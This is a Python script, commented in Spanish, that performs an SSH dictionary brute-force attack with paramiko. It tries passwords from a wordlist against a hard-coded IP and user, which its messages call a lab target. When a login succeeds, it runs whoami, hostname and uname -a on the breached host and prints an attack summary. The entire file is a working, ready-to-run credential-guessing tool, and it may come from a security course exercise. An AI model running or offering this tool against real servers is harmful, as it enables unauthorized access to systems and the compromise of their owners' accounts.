

import os
import sys
import time
import paramiko

IP_OBJETIVO = "100.55.25.242"
USUARIO = "ubuntu"
CARPETA = os.path.dirname(os.path.abspath(__file__))
DICCIONARIO_DEFAULT = os.path.join(CARPETA, "diccionario.txt")


def obtener_info_servidor(ssh):
    """ejecuta comandos basicos si logramos entrar"""
    info = {}

    comandos = {
        "usuario": "whoami",
        "hostname": "hostname",
        "sistema": "uname -a",
    }

    for nombre, comando in comandos.items():
        try:
            _, stdout, _ = ssh.exec_command(comando, timeout=5)
            salida = stdout.read().decode("utf-8", errors="ignore").strip()
            if salida:
                info[nombre] = salida
        except Exception:
            pass

    return info


def mostrar_resumen(datos):
    print("\n========== RESUMEN DEL ATAQUE SSH ==========\n")
    print(f" Objetivo: {datos['ip']}")
    print(f" Usuario: {datos['usuario']}")
    print(f" Diccionario: {datos['diccionario']}")
    print(f" Contraseñas en lista: {datos['total_lista']}")
    print(f" Intentos realizados: {datos['intentos']}")
    print(f" Fallos de autenticacion: {datos['fallos_auth']}")
    print(f" Errores de conexion: {datos['errores']}")
    print(f" Tiempo total: {datos['tiempo']:.1f} segundos")

    if datos["exito"]:
        print(f"\n Resultado: EXITO")
        print(f" Contraseña encontrada: {datos['password']}")
        if datos["info_servidor"]:
            print(f"\n Info del servidor remoto:")
            for clave, valor in datos["info_servidor"].items():
                print(f"   {clave}: {valor}")
    else:
        print(f"\n Resultado: FALLO")
        print(" No se encontro ninguna contraseña valida")

    print("\n============================================\n")


def ssh_bruteforce(target_ip, username, wordlist):
    inicio = time.time()

    resultado = {
        "ip": target_ip,
        "usuario": username,
        "diccionario": wordlist,
        "total_lista": 0,
        "intentos": 0,
        "fallos_auth": 0,
        "errores": 0,
        "tiempo": 0,
        "exito": False,
        "password": None,
        "info_servidor": {},
    }

    print(f"[+] Iniciando ataque SSH contra {target_ip}")
    print(f"[+] Usuario objetivo: {username}")
    print(f"[+] Diccionario: {wordlist}\n")

    try:
        with open(wordlist, "r", encoding="utf-8") as archivo:
            passwords = archivo.read().splitlines()
    except FileNotFoundError:
        print(f"[!] No se encontro el archivo: {wordlist}")
        resultado["tiempo"] = time.time() - inicio
        mostrar_resumen(resultado)
        return

    passwords = [p for p in passwords if p.strip() != ""]
    resultado["total_lista"] = len(passwords)

    if len(passwords) == 0:
        print("[!] El diccionario esta vacio")
        resultado["tiempo"] = time.time() - inicio
        mostrar_resumen(resultado)
        return

    for password in passwords:
        print(f"[*] Probando contraseña: {password}")
        resultado["intentos"] += 1

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(
                target_ip,
                username=username,
                password=password,
                timeout=5,
                banner_timeout=10,
                auth_timeout=10,
            )
            print(f"\n[+] CONTRASEÑA ENCONTRADA: {password}")

            resultado["exito"] = True
            resultado["password"] = password
            resultado["info_servidor"] = obtener_info_servidor(ssh)
            resultado["tiempo"] = time.time() - inicio
            mostrar_resumen(resultado)
            ssh.close()
            return

        except paramiko.AuthenticationException:
            resultado["fallos_auth"] += 1
        except paramiko.SSHException as e:
            resultado["errores"] += 1
            print(f"[!] Error SSH: {e}")
        except Exception as e:
            resultado["errores"] += 1
            print(f"[!] Error: {e}")
        finally:
            ssh.close()


        time.sleep(2)

    resultado["tiempo"] = time.time() - inicio
    mostrar_resumen(resultado)


if __name__ == "__main__":
    if len(sys.argv) == 4:
        ip = sys.argv[1]
        user = sys.argv[2]
        diccionario = sys.argv[3]
    elif len(sys.argv) == 2:
        ip = IP_OBJETIVO
        user = USUARIO
        diccionario = sys.argv[1]
        print(f"[*] Usando IP del laboratorio: {ip}")
        print(f"[*] Usando usuario del laboratorio: {user}\n")
    elif len(sys.argv) == 1:
        ip = IP_OBJETIVO
        user = USUARIO
        diccionario = DICCIONARIO_DEFAULT
        print(f"[*] Usando IP del laboratorio: {ip}")
        print(f"[*] Usando usuario del laboratorio: {user}")
        print(f"[*] Usando diccionario: {diccionario}\n")
    else:
        print("Uso: python ssh_brute.py [IP] [usuario] [diccionario.txt]")
        print("")
        print(" Ejemplos:")
        print("   python ssh_brute.py")
        print("   python ssh_brute.py otro_diccionario.txt")
        print("   python ssh_brute.py 100.55.25.242 ubuntu diccionario.txt")
        print("")
        print(f" Valores por defecto del proyecto:")
        print(f"   IP: {IP_OBJETIVO}")
        print(f"   Usuario: {USUARIO}")
        print(f"   Diccionario: {DICCIONARIO_DEFAULT}")
        sys.exit(1)

    ssh_bruteforce(ip, user, diccionario)
